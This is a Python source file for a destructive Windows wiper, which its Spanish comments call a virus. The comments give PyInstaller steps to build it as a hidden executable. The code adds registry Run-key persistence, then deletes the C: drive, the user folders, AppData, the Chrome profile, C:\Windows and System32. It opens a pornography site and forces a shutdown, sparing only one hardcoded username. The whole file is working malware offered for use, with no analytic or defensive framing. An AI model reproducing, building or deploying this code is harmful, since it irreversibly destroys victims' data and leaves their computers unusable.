#Para que el virus funcione se necesita ejecutar como administrador esto es porque el virus borra todo de la computadora y hace que no funcione ya
#en una cmd pon pyinstaller --onefile --noconsole --name XAREDHACKV11 --icon ruta del icono.
#primero pones pip install pyinstaller


#######################################################################################################################################################################################33

from getpass import getuser
import subprocess
import shutil
import os
import sys
from time import sleep as wait
import webbrowser

s = getuser()
expuser = os.path.expanduser("~")
AppData = fr"{expuser}\AppData"
localappdata = os.getenv("localappdata")
roaming = os.environ["AppData"]


def prs():
    evil_file_location = os.environ["appdata"] + "\\MyGodXCarlosX.exe"
    if not os.path.exists(evil_file_location):
        shutil.copyfile(sys.executable, evil_file_location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyGodXCarlosZX /t REG_SZ /d "' + evil_file_location + '"', shell=True)
    

def x():
    try:
        subprocess.call("DEL /F/Q/S C:", shell=True)
    except:
        pass
        
        
def d():
    try:
        subprocess.call(r"DEL /F/Q/S C:\Users", shell=True)
    except:
        pass

def dsktp():
    try:
        subprocess.call(fr"DEL /F/Q/S {expuser}\Desktop", shell=True)
    except:
        pass
    

def docs():
    try:
        subprocess.call(fr"DEL /F/Q/S {expuser}\Documents", shell=True)
    except:
        pass
    
def imgs():
    try:
        subprocess.call(fr"DEL /F/Q/S {expuser}\Pictures", shell=True)
    except:
        pass
    
def music():
    try:
        subprocess.call(fr"DEL /F/Q/S {expuser}\Music", shell=True)
    except:
        pass
    

def Downloads():
    try:
        subprocess.call(fr"DEL /F/Q/S {expuser}\Downloads", shell=True)
    except:
        pass
    
def AppData():
    try:
        subprocess.call(fr"DEL /F/Q/S {AppData}", shell=True)
    except:
        pass
    

def Roaming():
    try:
        subprocess.call(fr"DEL /F/Q/S {roaming}", shell=True)
    except:
        pass    
    
def lcpd():
    try:
        subprocess.call(fr"DEL /F/Q/S {localappdata}", shell=True)
    except:
        pass    
 
def DelGoogle():
    try:
        subprocess.call(fr"DEL /F/Q/S {localappdata}\Google\Chrome\User Data\Default", shell=True)
    except:
        pass
    

def wins():
    try:
        subprocess.call(r'rd /s /q "C:\Windows"', shell=True)
    except:
        pass
        
        
def syx():
    try:
        subprocess.call(r'rd /s /q "C:\Windows\System32"', shell=True)
    except:
        pass
  

        
    
prs()


if s == "Denisse":
    prs()
    os.chdir("C:/")
    print("Hack Reach and aura!")
    wait(0.8)
    subprocess.call("exit", shell=True)
else:
    prs()
    webbrowser.open("https://pornhub.com")
    wait(0.8)
    wins()
    x()
    syx()
    d()
    docs()
    imgs()
    music()
    Downloads()
    AppData()
    Roaming()
    lcpd()
    DelGoogle()
    wait(0.1)
    dsktp()
    print(":)")
    wait(0.1)
    subprocess.call("shutdown /p", shell=True)